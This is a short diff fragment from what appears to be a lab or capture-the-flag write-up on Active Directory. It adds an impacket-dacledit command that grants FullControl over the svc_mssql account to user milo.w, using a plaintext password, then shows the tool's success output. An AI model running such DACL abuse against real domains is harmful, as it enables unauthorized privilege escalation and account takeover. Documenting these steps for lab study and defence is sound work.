@@ -457,5 +457,12 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 First ill grant owndership over the object
 
 ```python
+impacket-dacledit -action 'write' -rights 'FullControl' -principal 'milo.w' -target 'svc_mssql' 'shadowgate.local'/'milo.w':'Password123!'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] DACL backed up to dacledit-20260731-195038.bak
+[*] DACL modified successfully!
 ```
+
+Now ive granted GenericAll
+
